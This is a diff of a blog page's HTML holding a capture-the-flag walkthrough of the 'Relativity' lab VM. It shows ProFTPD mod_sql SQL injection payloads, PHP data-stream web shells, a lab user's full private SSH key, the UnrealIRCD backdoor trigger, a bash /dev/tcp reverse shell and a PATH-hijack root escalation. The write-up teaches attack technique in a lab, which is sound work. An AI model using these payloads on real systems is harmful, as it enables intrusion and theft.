@@ -94,35 +94,32 @@
 
 <p>It all started with an announcement on the Zacon mailing list. A friendly heads-up about the challenge and some details were made available. We were given a hostname of where the challenge lived with clear instructions to find <code>flag.txt</code>. Sounds simple. I slapped the hostname as a url in a browser and was met with a image of M.C. Eshter&rsquo;s &lsquo;Relativity&rsquo;. Great. Something to start thinking about. I also nmapped the box. I mean, how else would you start, right? :)</p>
 
-<p>```bash 192.168.56.21 Nmap
+<pre><code class="language-bash"># 192.168.56.21 Nmap
 Nmap scan report for 192.168.56.21 (192.168.56.21)
 Host is up (0.0024s latency).
 Not shown: 997 filtered ports
 PORT   STATE SERVICE
 21/tcp open  ftp
 22/tcp open  ssh
-80/tcp open  http</p>
+80/tcp open  http
+</code></pre>
 
-<pre><code>
-Alright. This gives you a good idea of whats happening on the host, as well as some points to start off with.
+<p>Alright. This gives you a good idea of whats happening on the host, as well as some points to start off with.</p>
 
-### initial enumeration
-Enumeration is key to starting something like this. The more you know about the host, the more you are able to adapt and think about as you go through the challenge. So, we know we have a SSH Server, a FTP server and a Web server exposed.
+<h3 id="initial-enumeration:148726962b60da82f616754f53c617fb">initial enumeration</h3>
 
-Starting with the SSH server, I tried to check if password based authentication was on. Maybe Mr MC Eshter had an account on this box? You never know :)
+<p>Enumeration is key to starting something like this. The more you know about the host, the more you are able to adapt and think about as you go through the challenge. So, we know we have a SSH Server, a FTP server and a Web server exposed.</p>
 
-``` bash SSH Login
-# ssh eshter@192.168.56.21
+<p>Starting with the SSH server, I tried to check if password based authentication was on. Maybe Mr MC Eshter had an account on this box? You never know :)</p>
+
+<pre><code class="language-bash">$ ssh eshter@192.168.56.21
 Permission denied (publickey).
 </code></pre>
 
 <p>So, we now know only key based authentication works. Thats fine. Next up was the FTP service.</p>
 
-<p>```bash FTP Login</p>
-
-<h1 id="ftp-192-168-56-21:148726962b60da82f616754f53c617fb">ftp 192.168.56.21</h1>
-
-<p>Connected to 192.168.56.21.
+<pre><code class="language-bash">$ ftp 192.168.56.21
+Connected to 192.168.56.21.
 220 Welcome to Relativity FTP (mod_sql)
 Name (192.168.56.21:root): anonymous
 331 Password required for anonymous.
@@ -131,13 +128,12 @@ Password:
 Login failed.
 Remote system type is UNIX.
 Using binary mode to transfer files.
-ftp&gt;</p>
+ftp&gt;
+</code></pre>
 
-<pre><code>
-No anonymous FTP logins either. It appears that the Server's FTP banner has been customised and is maybe using the mod_sql plugin. A quick Google for mod_sql revealed that this may be ProFTPD with the mod_sql plugin. Great. This is an important piece of information. To complete the enumeration I moved on to the web server. It was time to inspect some request responses.
+<p>No anonymous FTP logins either. It appears that the Server&rsquo;s FTP banner has been customised and is maybe using the mod_sql plugin. A quick Google for mod_sql revealed that this may be ProFTPD with the mod_sql plugin. Great. This is an important piece of information. To complete the enumeration I moved on to the web server. It was time to inspect some request responses.</p>
 
-```bash Apache tokens.
-# curl -v 192.168.56.21
+<pre><code class="language-text">$ curl -v 192.168.56.21
 * About to connect() to 192.168.56.21 port 80 (#0)
 *   Trying 192.168.56.21...
 * connected
@@ -179,27 +175,23 @@ No anonymous FTP logins either. It appears that the Server's FTP banner has been
 
 <p>The next step was the FTP server. As it was purposely disclosing the fact that it was using mod_sql, instinct kicked in and I attempted to check the responses if I tried to login with username <strong>&lsquo;</strong> and password <strong>&lsquo;</strong>.</p>
 
-<p>```bash mod_sql SQLi attempt</p>
-
-<h1 id="ftp-192-168-56-21-1:148726962b60da82f616754f53c617fb">ftp 192.168.56.21</h1>
-
-<p>Connected to 192.168.56.21.
+<pre><code class="language-bash"># ftp 192.168.56.21
+Connected to 192.168.56.21.
 220 Welcome to Relativity FTP (mod_sql)
-Name (192.168.56.21:root): &lsquo;
-331 Password required for &lsquo;.
+Name (192.168.56.21:root): '
+331 Password required for '.
 Password:
 421 Service not available, remote server has closed connection
 Login failed.
 No control connection for command: Success
-ftp&gt;</p>
+ftp&gt;
+</code></pre>
 
-<pre><code>
-As you can clearly see, the response does differ from when I initially attempted to login as anonymous. This highly suggests that one of the fields is SQL injectable. And so, it was research time. Using good 'ol trusty Google, I searched for *proftpd mod_sql injection vulnerability*. Hey presto! The very first hit describes a vulnerability [disclosed](http://www.securityfocus.com/bid/33722) in 2009.
+<p>As you can clearly see, the response does differ from when I initially attempted to login as anonymous. This highly suggests that one of the fields is SQL injectable. And so, it was research time. Using good &lsquo;ol trusty Google, I searched for <em>proftpd mod_sql injection vulnerability</em>. Hey presto! The very first hit describes a vulnerability <a href="http://www.securityfocus.com/bid/33722">disclosed</a> in 2009.</p>
 
-From this research, we can be pretty confident in thinking that this specific FTP server may as well be vulnerable to the exact same vulnerability, and may very well be our first entry point into the system. Sample exploits are available [here](http://www.securityfocus.com/bid/33722/exploit), and as such I attempted to exploit this. I copied the SQLi payload from the website `%') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --` and pasted this as the username, whereafter I provided 1 as the password.
+<p>From this research, we can be pretty confident in thinking that this specific FTP server may as well be vulnerable to the exact same vulnerability, and may very well be our first entry point into the system. Sample exploits are available <a href="http://www.securityfocus.com/bid/33722/exploit">here</a>, and as such I attempted to exploit this. I copied the SQLi payload from the website <code>%') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --</code> and pasted this as the username, whereafter I provided 1 as the password.</p>
 
-```bash mod_sql SQLi attempt 2
-# ftp 192.168.56.21
+<pre><code class="language-bash"># ftp 192.168.56.21
 Connected to 192.168.56.21.
 220 Welcome to Relativity FTP (mod_sql)
 Name (192.168.56.21:root): %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --
@@ -213,28 +205,25 @@ ftp&gt; bye
 
 <p>No dice. :| Ok, well I guess I couldn&rsquo;t have expected it to be <em>that</em> easy. This caused me to dig even deeper and research exactly what the problem is, and why this vulnerability exists. Eventually, I got hold of a vulnerable version of the software, set it up in a LAB VM, and tested the SQLi payload until it worked. I ended up with a slightly different payload to the ones available online.</p>
 
-<p>```bash mod_sql SQLi success</p>
-
-<h1 id="ftp-192-168-56-21-2:148726962b60da82f616754f53c617fb">ftp 192.168.56.21</h1>
-
-<p>Connected to 192.168.56.21.
+<pre><code class="language-bash"># ftp 192.168.56.21
+Connected to 192.168.56.21.
 220 Welcome to Relativity FTP (mod_sql)
-Name (192.168.56.21:root): %&lsquo;) and 1=2 union select 1,1,uid,gid,homedir,shell from users;#
-331 Password required for %&lsquo;).
+Name (192.168.56.21:root): %') and 1=2 union select 1,1,uid,gid,homedir,shell from users;#
+331 Password required for %').
 Password:
-230 User %&lsquo;) and 1=2 union select 1,1,uid,gid,homedir,shell from users;# logged in.
+230 User %') and 1=2 union select 1,1,uid,gid,homedir,shell from users;# logged in.
 Remote system type is UNIX.
 Using binary mode to transfer files.
-ftp&gt;</p>
+ftp&gt;
+</code></pre>
 
-<pre><code>
-w00t. Notice the difference though? The SQL commenting was changed from -- to #. Apparently, MySQL is pretty finicky about the fact that the -- style comments should have a space afterwards. This means that a payload ending with say, `from users; -- NOTHING_OF_VALUE` would have worked too. Just putting a space after the -- did not work as the software most probably does a type of `trim()` on the field, hence the need to have something after the space too. Awesome, something learnt.
+<p>w00t. Notice the difference though? The SQL commenting was changed from &ndash; to #. Apparently, MySQL is pretty finicky about the fact that the &ndash; style comments should have a space afterwards. This means that a payload ending with say, <code>from users; -- NOTHING_OF_VALUE</code> would have worked too. Just putting a space after the &ndash; did not work as the software most probably does a type of <code>trim()</code> on the field, hence the need to have something after the space too. Awesome, something learnt.</p>
 
-### web based attack
-Now that we have FTP access to the host, we simply needed to `ls` to learn what is the next step.
+<h3 id="web-based-attack:148726962b60da82f616754f53c617fb">web based attack</h3>
 
-```bash FTP Web Directory Reveal```
-ftp&gt; ls
+<p>Now that we have FTP access to the host, we simply needed to <code>ls</code> to learn what is the next step.</p>
+
+<pre><code class="language-bash">ftp&gt; ls
 200 PORT command successful
 150 Opening ASCII mode data connection for file list
 drwxr-xr-x   3 root     root         4096 Mar  5  2013 0f756638e0737f4a0de1c53bf8937a08
@@ -254,40 +243,44 @@ ftp&gt;
 
 <p>My first attempts to exploit this was very successful. For this kind of potential vulnerability, I have a small PHP <a href="http://php.net/manual/en/wrappers.data.php">data stream wrapper</a> shell in my toolbox. Normally, the shell looks something like this:</p>
 
-<p>```php PHP Data stream Wrapper Shell
-?file=data:,&lt;?php system($_GET[c]); ?&gt;&amp;c=ls</p>
+<pre><code class="language-php">?file=data:,&lt;?php system($_GET[c]); ?&gt;&amp;c=ls
+</code></pre>
 
-<pre><code>
-Sometimes however, sites tend to attempt to filter out certain PHP commands. So, in order to increase the chances of success, a base64 encoded version ends up being my favourite:
+<p>Sometimes however, sites tend to attempt to filter out certain PHP commands. So, in order to increase the chances of success, a base64 encoded version ends up being my favourite:</p>
 
-```php Base 64 Encoded Data stream Wrapper Shell
-?file=data:;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=&amp;c=dir
+<pre><code class="language-php">?file=data:;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=&amp;c=dir
 </code></pre>
 
 <p>I used this and now had shell access to the box. Remembering the basic tips of enumerate-&gt;exploit-&gt;post-exploit, I ran a few simple commands, just to get a better feel for the environment that I was facing. I was using Google Chrome. If you add &lsquo;view-source:&rsquo; to the front of a url, or right click-&gt; view source, then you will see the output for your command shell in a much neater and easier to read layout. I ran the commands <code>id; uname -a; sestatus; pwd; ls -lah /home; cat /etc/passwd</code>:</p>
 
-<p>{% img <a href="http://i.imgur.com/pnBHjXv.png">http://i.imgur.com/pnBHjXv.png</a> %}</p>
+
+<figure >
+    
+        <img src="https://leonjza.github.io/images/relativity_command_injection.png" />
+    
+    
+</figure>
+
 
 <p>From this we know that the server is running Fedora Core 17, with the 3.9.8-100 kernel. SELinux is disabled. There are 2 users with /home directories, of which <code>jetta</code>&rsquo;s directory is protected from me reading it at the moment. root, mauk and jetta all have valid logins shells too.</p>
 
 <p>Taking one quick step back, I investigated the sources of the website in order to maybe find some credentials that may attach this website to a database or something similarly useful. While doing this, I noticed the index.php page was in fact doing partial input validation, which may cause some web shells not to work :)</p>
 
-<p>```php Hidden site index validation
-$blacklist_include=array(&ldquo;php://&ldquo;);
+<pre><code class="language-php">$blacklist_include=array(&quot;php://&quot;);
 for ($i=0; $i&lt;count($blacklist_include); $i++){
-         if (strpos($_GET[&lsquo;page&rsquo;],$blacklist_include[$i]) !== false){
+         if (strpos($_GET['page'],$blacklist_include[$i]) !== false){
                 die();
         }
 }
-$page = $_GET[&lsquo;page&rsquo;];
-include ($page);</p>
+$page = $_GET['page'];
+include ($page);
+</code></pre>
 
-<pre><code>
-### gaining further access
-From here you can of course take the time to set yourself up with a very nice interactive shell using this web based remote file inclusion vulnerability. However, browsing around the file system its clear that you can browse in the user `mauk`'s home directory. While the directory itself has nothing of real value, there are still the hidden directories to view. Usually, these include things such as the users bash_history, bashrc etc. Also, ssh key related information would typically reside inside .ssh/. In this users .ssh/ directory, he left he’s SSH private key there, with permissions set so that anyone can read it. So, using the web based remote file include shell we are able to steal this off the server with the command `cat /home/mauk/.ssh/id_rsa`, which would echo us the key.
+<h3 id="gaining-further-access:148726962b60da82f616754f53c617fb">gaining further access</h3>
 
-```bash User mauk's private SSH key:
------BEGIN RSA PRIVATE KEY-----
+<p>From here you can of course take the time to set yourself up with a very nice interactive shell using this web based remote file inclusion vulnerability. However, browsing around the file system its clear that you can browse in the user <code>mauk</code>&rsquo;s home directory. While the directory itself has nothing of real value, there are still the hidden directories to view. Usually, these include things such as the users bash_history, bashrc etc. Also, ssh key related information would typically reside inside .ssh/. In this users .ssh/ directory, he left he’s SSH private key there, with permissions set so that anyone can read it. So, using the web based remote file include shell we are able to steal this off the server with the command <code>cat /home/mauk/.ssh/id_rsa</code>, which would echo us the key.</p>
+
+<pre><code class="language-text">-----BEGIN RSA PRIVATE KEY-----
 MIIEpAIBAAKCAQEA5sm/rHHoCaTtncp7DCSIJlWnUg9eyfpJ3czIn18U1lv5ZQf0
 9yGaDxafualdpXCNMo32mVQb9XQ7c2N7sdSdAjsgSjV0YG/IZGZNRyFS58YJQRdZ
 5wRu6eKAlQVss/Lq3zwuBsT8Om/1/cKpVgB3ukPtKA97M5iSxL1VWWXg6GVoJ6f6
@@ -318,24 +311,21 @@ aXwuOk5Dt0/xQWPAKHL6HYyzQjnad/VAmn6tnxko1A/S8ELiG+MUtg==
 
 <p>What is particularly important to note here is the fact that this private key is not password protected. Usually, password protected keys would have a line such as <code>Proc-Type: 4,ENCRYPTED</code> indicating this. This key does not. So, using this, it would be as easy as specifying a private key to use when connecting and viola. I saved the the contents of <code>id_rsa</code> to a file called <code>key</code>, and specified it to be used when connecting with the <code>-i</code> flag:</p>
 
-<p>```bash SSH access as mauk</p>
-
-<h1 id="ssh-mauk-192-168-56-21-i-key:148726962b60da82f616754f53c617fb">ssh mauk@192.168.56.21 -i key</h1>
-
-<p>[mauk@Relativity ~]$ id
+<pre><code class="language-bash"># ssh mauk@192.168.56.21 -i key
+[mauk@Relativity ~]$ id
 uid=1001(mauk) gid=1001(mauk) groups=1001(mauk)
-[mauk@Relativity ~]$</p>
+[mauk@Relativity ~]$
+</code></pre>
 
-<pre><code>
-w00t. Now, we have a proper interactive shell as the user `mauk`! :)
+<p>w00t. Now, we have a proper interactive shell as the user <code>mauk</code>! :)</p>
 
-### enumerating the next step
-Again, enumerate-&gt;exploit-&gt;post-exploit are very important steps. Now we find ourselves at the post-exploitation part again. Learn as much as you can about everything you can. Having the interactive SSH session that we have now, it was a breeze to learn quite a lot about the server. More importantly, learning about that which we also don’t have access to.
+<h3 id="enumerating-the-next-step:148726962b60da82f616754f53c617fb">enumerating the next step</h3>
 
-Enumeration is not just about files and the access. It also includes network interfaces, configuration etc. In the user `mauk`'s case, he had a .bash_history file, which revealed the key to the next part of the challenge. I also noticed port 6667 (irc) being open locally along with a ircd running as the user jetta.
+<p>Again, enumerate-&gt;exploit-&gt;post-exploit are very important steps. Now we find ourselves at the post-exploitation part again. Learn as much as you can about everything you can. Having the interactive SSH session that we have now, it was a breeze to learn quite a lot about the server. More importantly, learning about that which we also don’t have access to.</p>
 
-```bash Mauks bash_history
-[mauk@Relativity ~]$ cat .bash_history
+<p>Enumeration is not just about files and the access. It also includes network interfaces, configuration etc. In the user <code>mauk</code>&rsquo;s case, he had a .bash_history file, which revealed the key to the next part of the challenge. I also noticed port 6667 (irc) being open locally along with a ircd running as the user jetta.</p>
+
+<pre><code class="language-bash">[mauk@Relativity ~]$ cat .bash_history
 
 ssh -f root@192.168.144.228 -R 6667:127.0.0.1:6667 -N
 su -
@@ -350,11 +340,10 @@ su -
 
 <p>With the now forwarded IRC port, my local client connected to the irc service, and the following MOTD was sent:</p>
 
-<p>```bash Relativity IRC
-Connecting…
+<pre><code class="language-bash">Connecting…
 Connected
-*** Looking up your hostname&hellip;
-*** Couldn&rsquo;t resolve your hostname; using your IP address instead
+*** Looking up your hostname...
+*** Couldn't resolve your hostname; using your IP address instead
 Logged in
 Welcome to the Relativity IRC Network bobsmith!bobsmith@localhost
 Your host is relativity.localdomain, running version Unreal3.2.8.1
@@ -370,26 +359,25 @@ Current Global Users: 1  Max: 1
 - relativity.localdomain Message of the Day -
 - 9/7/2013 9:17
 -     __________       .__          __  .__      .__  __
--     ______   \ ____ |  | _____ <em>/  |</em>|<strong>|</strong>  _|_<em>|/  |</em> _<strong>.</strong>.
--      |       _// __ |  | __  \   __\  \  \/ /  \   __&lt;   |  |
--      |    |   \  _<strong>/|  |</strong>/ __ |  | |  |\   /|  ||  |  ___  |
--      |__<strong>|_  /_</strong>  &gt;_<strong><em>(</em></strong>_  /<strong>| |</strong>| _/ |<strong>||</strong>|  / ____| ·VM·
+-     \______   \ ____ |  | _____ _/  |_|__|__  _|__|/  |_ ___.__.
+-      |       _// __ \|  | \__  \\   __\  \  \/ /  \   __&lt;   |  |
+-      |    |   \  ___/|  |__/ __ \|  | |  |\   /|  ||  |  \___  |
+-      |____|_  /\___  &gt;____(____  /__| |__| \_/ |__||__|  / ____| ·VM·
 -             \/     \/          \/                        \/
-End of /MOTD command.</p>
+End of /MOTD command.
+</code></pre>
 
-<pre><code>
-Toying around with the IRC service did not yeald much results. No useful channels or anything funny was found with the service. However, the actual server that was running was [UnrealIRCD](http://www.unrealircd.com/) v 3.8.2.1 as can be seen in the servers MOTD. Again, using this amazing tool called Google, I checked whats up with this version of UnrealIRCD. Lo and behold the first hit 'UnrealIRCD 3.2.8.1 Backdoor Command Execution - Rapid7'. Excellent. Seems like this version has a remote command execution backdoor. The hit on Google to Rapid7's actually links to a Metasploit module for this exact same backdoor.
+<p>Toying around with the IRC service did not yeald much results. No useful channels or anything funny was found with the service. However, the actual server that was running was <a href="http://www.unrealircd.com/">UnrealIRCD</a> v 3.8.2.1 as can be seen in the servers MOTD. Again, using this amazing tool called Google, I checked whats up with this version of UnrealIRCD. Lo and behold the first hit &lsquo;UnrealIRCD 3.2.8.1 Backdoor Command Execution - Rapid7&rsquo;. Excellent. Seems like this version has a remote command execution backdoor. The hit on Google to Rapid7&rsquo;s actually links to a Metasploit module for this exact same backdoor.</p>
 
-It was time to research the vulnerability a bit, just to understand what exactly is going on here. A great resource was found [here](http://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html), where it was explained that a piece of code exists `#define DEBUG3_DOLOG_SYSTEM(x) system(x)`, that does a system command if it sees traffic prepended with `AB;`. Alright. I didn’t have metasploit immediately available, so I opted for the `nc` shell, just to test it out. To my disappointment, it seemed like I missed something very important here as I received no output when issuing commands.
+<p>It was time to research the vulnerability a bit, just to understand what exactly is going on here. A great resource was found <a href="http://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html">here</a>, where it was explained that a piece of code exists <code>#define DEBUG3_DOLOG_SYSTEM(x) system(x)</code>, that does a system command if it sees traffic prepended with <code>AB;</code>. Alright. I didn’t have metasploit immediately available, so I opted for the <code>nc</code> shell, just to test it out. To my disappointment, it seemed like I missed something very important here as I received no output when issuing commands.</p>
 
-So back to the drawing board it was. I decided to download and compile my own local version of the backdoored ircd daemon, and test what the expected result of this backdoor should be. At the same time I also learnt a little about unrealircd itself and how to configure it. win :)
+<p>So back to the drawing board it was. I decided to download and compile my own local version of the backdoored ircd daemon, and test what the expected result of this backdoor should be. At the same time I also learnt a little about unrealircd itself and how to configure it. win :)</p>
 
-Eventually I got the daemon running and was able to test the backdoor locally. Still, no command output was received when commands were issued, however, I did notice that the commands themselves actually **do** execute. I echoed 'a' to a file in /tmp/ via the backdoor, and in a SSH session confirmed that it now existed.
+<p>Eventually I got the daemon running and was able to test the backdoor locally. Still, no command output was received when commands were issued, however, I did notice that the commands themselves actually <strong>do</strong> execute. I echoed &lsquo;a&rsquo; to a file in /tmp/ via the backdoor, and in a SSH session confirmed that it now existed.</p>
 
-So, back on the challenge vm, I have port 6667 still forwarded locally. To test this, I ran a command to list the contents of /home/ and redirect the output to a file in /tmp.
+<p>So, back on the challenge vm, I have port 6667 still forwarded locally. To test this, I ran a command to list the contents of /home/ and redirect the output to a file in /tmp.</p>
 
-```bash Testing UnrealIRCD backdoor
-# echo &quot;AB; ls -lah /home/ &gt; /tmp/1&quot; | nc 127.0.0.1 6667
+<pre><code class="language-bash"># echo &quot;AB; ls -lah /home/ &gt; /tmp/1&quot; | nc 127.0.0.1 6667
 :relativity.localdomain NOTICE AUTH :*** Looking up your hostname...
 :relativity.localdomain NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
 :relativity.localdomain 451 AB; :You have not registered
@@ -398,19 +386,17 @@ So, back on the challenge vm, I have port 6667 still forwarded locally. To test 
 
 <p>Back on the SSH session I had with <code>mauk</code>&rsquo;s account, /tmp/1 appeared, however without permissions for me to see it. So, I reran the previous command, substituting the backdoor command to <code>chmod 777 /tmp/1</code>. I reran the cat on /tmp/1 in mauk&rsquo;s session and bam:</p>
 
-<p>```bash UnrealIRCD backdoor testing
-mauk@Relativity ~]$ cat /tmp/1
+<pre><code class="language-bash">mauk@Relativity ~]$ cat /tmp/1
 total 16K
 drwxr-xr-x.  4 root  root  4.0K Feb 25  2013 .
 dr-xr-xr-x. 18 root  root  4.0K Feb 28  2013 ..
-drwx&mdash;&mdash;.  4 jetta jetta 4.0K Sep 28 10:03 jetta
-drwxr-xr-x.  3 mauk  mauk  4.0K Jul  9 08:55 mauk</p>
+drwx------.  4 jetta jetta 4.0K Sep 28 10:03 jetta
+drwxr-xr-x.  3 mauk  mauk  4.0K Jul  9 08:55 mauk
+</code></pre>
 
-<pre><code>
-Oh yes! Its working! In a broken kind of way, but it works! To make my life a little easier, I changed the backdoor command to actually give me a back connect bash shell so that I can have a interactive session. Its a time saving thing really. My command to the IRCd was now `echo &quot;AB; bash -i &gt;&amp; /dev/tcp/&lt;my machine&gt;/6676 0&gt;&amp;1&quot; | nc 127.0.0.1 6667`. On my machine I opened a netcat listener on port 6676 and waited for the session to spawn:
+<p>Oh yes! Its working! In a broken kind of way, but it works! To make my life a little easier, I changed the backdoor command to actually give me a back connect bash shell so that I can have a interactive session. Its a time saving thing really. My command to the IRCd was now <code>echo &quot;AB; bash -i &gt;&amp; /dev/tcp/&lt;my machine&gt;/6676 0&gt;&amp;1&quot; | nc 127.0.0.1 6667</code>. On my machine I opened a netcat listener on port 6676 and waited for the session to spawn:</p>
 
-```bash Back connect shell for jetta
-# nc -vnlp 6676
+<pre><code class="language-bash"># nc -vnlp 6676
 listening on [any] 6676 ...
 connect to [&lt;snip&gt;] from (UNKNOWN) [192.168.56.21] 53493
 bash: no job control in this shell
@@ -419,43 +405,38 @@ bash: no job control in this shell
 
 <p>Great. Now it will be a lot easier to navigate around. Spawing the shell the way I did started me off in <code>/opt/Unreal</code>, which was a directory I previously did not have access to. I poked around here for a bit, trying to see if I missed anything with regards to the IRC setup. Nothing was immediately apparent, so, I moved on to the rest of the machine. More specifically, in <code>jetta</code>&rsquo;s home directory, there was a binary called <code>auth_server</code>, owned by root, but with no suid bit. I attempted to execute the binary, and was greeted by a spinning pipe, and eventually a &lsquo;error(12)&rsquo; after a classic cowsay.</p>
 
-<p>```bash auth_server Test run
-[jetta@Relativity ~]$ ls -lah auth_server/auth_server
+<pre><code class="language-bash">[jetta@Relativity ~]$ ls -lah auth_server/auth_server
 ls -lah auth_server/auth_server
 -rwxr-xr-x 1 root root 7.9K Mar  8  2013 auth_server/auth_server
 [jetta@Relativity ~]$ auth_server/auth_server
 auth_server/auth_server
-[+] Checking Certificates&hellip;done
-[+] Contacting server, please wait&hellip;- ____________________________
+[+] Checking Certificates...done
+[+] Contacting server, please wait...- ____________________________
 / Windows 2000 is out!       \
 |                            |
-\ &ndash; PC Magazine, April 2013 /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
+\ -- PC Magazine, April 2013 /
+ ----------------------------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+could not establish connection
+error: (12)
+[jetta@Relativity ~]$
 </code></pre>
 
-<p>could not establish connection
-error: (12)
-[jetta@Relativity ~]$</p>
+<p>Right&hellip; well that is not exactly very helpful&hellip; or is it? Admittedly, this was the part that cost me the most time. I got lost on a path which is lead by enum-&gt;sploit-&gt;post, and wandered off into a world of binary analysis, process packet sniffing and eventually reverse engineering. Initially, I somehow figured that <code>auth_server</code> should be running, and <em>should</em> provide the IRCd with NickServ capabilities, so that <em>maybe</em> I could VHOST to a vDomain of a operator account, IDENT as him and then discover other hidden treasures&hellip;</p>
 
-<pre><code>
-Right... well that is not exactly very helpful... or is it? Admittedly, this was the part that cost me the most time. I got lost on a path which is lead by enum-&gt;sploit-&gt;post, and wandered off into a world of binary analysis, process packet sniffing and eventually reverse engineering. Initially, I somehow figured that `auth_server` should be running, and *should* provide the IRCd with NickServ capabilities, so that *maybe* I could VHOST to a vDomain of a operator account, IDENT as him and then discover other hidden treasures...
+<p>Granted, I did do some basic enum, and figured after I ran <code>id</code> and saw that the account for <code>jetta</code> was not in any fancy groups, there was nothing more to see here.</p>
 
-Granted, I did do some basic enum, and figured after I ran `id` and saw that the account for `jetta` was not in any fancy groups, there was nothing more to see here.
+<p><strong>EVENTUALLY</strong>, after a number of tactical coffees and rethinking of what I have seen so far, I came back to re-attempt this.</p>
 
-**EVENTUALLY**, after a number of tactical coffees and rethinking of what I have seen so far, I came back to re-attempt this.
+<h3 id="the-shortest-straw:148726962b60da82f616754f53c617fb">the shortest straw</h3>
 
-### the shortest straw
-I reran `auth_server` a few more times, and decided to push the binary through strings one more time, just to see if *maybe* the clue will be more clear now:
+<p>I reran <code>auth_server</code> a few more times, and decided to push the binary through strings one more time, just to see if <em>maybe</em> the clue will be more clear now:</p>
 
-```bash auth_server Strings-ed
-# strings auth_server
+<pre><code class="language-bash"># strings auth_server
 /lib64/ld-linux-x86-64.so.2
 __gmon_start__
 libc.so.6
@@ -484,42 +465,39 @@ Starting Auth server..
 
 <p>This did not help me get what I was clearly missing, and so, I went back to the enumeration step. What do I know about my current environment? WHERE do I have access now? WHAT access do I have? Anything different here that I may be missing. Eventually, I tried to so a <code>sudo -l</code>, which should list the commands I am allowed to run with sudo. Because my shells were all build with netcat, I had no proper tty to work with, so, sudo would complain about this. A quick fix with python, and all is well again:</p>
 
-<p>```bash jetta&rsquo;s sudo -l
-[jetta@Relativity ~]$ sudo -l
+<pre><code class="language-bash">[jetta@Relativity ~]$ sudo -l
 sudo -l
 sudo: sorry, you must have a tty to run sudo
-[jetta@Relativity ~]$ python -c &ldquo;import pty;pty.spawn(&lsquo;/bin/sh&rsquo;);&rdquo;
-python -c &ldquo;import pty;pty.spawn(&lsquo;/bin/sh&rsquo;);&rdquo;
+[jetta@Relativity ~]$ python -c &quot;import pty;pty.spawn('/bin/sh');&quot;
+python -c &quot;import pty;pty.spawn('/bin/sh');&quot;
 sh-4.2$ sudo -l
 sudo -l
 Matching Defaults entries for jetta on this host:
-    requiretty, env_keep=&ldquo;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
-    LS_COLORS&rdquo;, env_keep+=&ldquo;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
-    LC_CTYPE&rdquo;, env_keep+=&ldquo;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
-    LC_MESSAGES&rdquo;, env_keep+=&ldquo;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
-    LC_TELEPHONE&rdquo;, env_keep+=&ldquo;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
-    XAUTHORITY PATH&rdquo;, env_reset</p>
+    requiretty, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
+    LS_COLORS&quot;, env_keep+=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
+    LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
+    LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
+    LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+    XAUTHORITY PATH&quot;, env_reset
 
-<p>User jetta may run the following commands on this host:
+User jetta may run the following commands on this host:
     (root) NOPASSWD: /home/jetta/auth_server/auth_serveyr
-sh-4.2$</p>
+sh-4.2$
+</code></pre>
 
-<pre><code>
-And there it is! `auth_server` may be run as root with no password requirement! \o/. Immediately I jumped to running `sudo /home/jetta/auth_server/auth_server`, just to be met with the same fate of 'error(12)'. While playing with the binary earlier, I was however convinced that this error(12) thing was exactly what it was configured to do and nothing more. Yes, thats it. Simply write the 'Checking Certs', 'Contacting Server' part, then, run `fortune -s | /usr/bin/cowsay` and error(12).
+<p>And there it is! <code>auth_server</code> may be run as root with no password requirement! \o/. Immediately I jumped to running <code>sudo /home/jetta/auth_server/auth_server</code>, just to be met with the same fate of &lsquo;error(12)&rsquo;. While playing with the binary earlier, I was however convinced that this error(12) thing was exactly what it was configured to do and nothing more. Yes, thats it. Simply write the &lsquo;Checking Certs&rsquo;, &lsquo;Contacting Server&rsquo; part, then, run <code>fortune -s | /usr/bin/cowsay</code> and error(12).</p>
 
-... wait a sec. `fortune` is not called from its full relative path, however /usr/bin/cowsay is. This means if I can fool the binary into thinking something else is this `fortune` command, then I may be able to root the box. Especially if I can make it think my bash shell is `fortune` :)
+<p>&hellip; wait a sec. <code>fortune</code> is not called from its full relative path, however /usr/bin/cowsay is. This means if I can fool the binary into thinking something else is this <code>fortune</code> command, then I may be able to root the box. Especially if I can make it think my bash shell is <code>fortune</code> :)</p>
 
-### finishing off
-With all the knowledge I have gained now, I moved on to finishing off by rooting the box. This was achieved by firstly creating a script called `fortune`, which was simply the old bash command pushed over /dev/tcp again, and placing it in */home/jetta/bin*. I then ensured that `fortune` was executable and tested it by just running it alone. It was working fine :)
+<h3 id="finishing-off:148726962b60da82f616754f53c617fb">finishing off</h3>
 
-Next, I have to fool the auth_server binary to think that my new fortune script is in fact the one it was looking for. To do this, I added a path to the PATH env variable, and rehashed the bins. Lastly, I ran `auth_server` as root, and switched to my last nc listener on port 6677...
+<p>With all the knowledge I have gained now, I moved on to finishing off by rooting the box. This was achieved by firstly creating a script called <code>fortune</code>, which was simply the old bash command pushed over /dev/tcp again, and placing it in <em>/home/jetta/bin</em>. I then ensured that <code>fortune</code> was executable and tested it by just running it alone. It was working fine :)</p>
 
-```bash auth_server Exploitation
+<p>Next, I have to fool the auth_server binary to think that my new fortune script is in fact the one it was looking for. To do this, I added a path to the PATH env variable, and rehashed the bins. Lastly, I ran <code>auth_server</code> as root, and switched to my last nc listener on port 6677&hellip;</p>
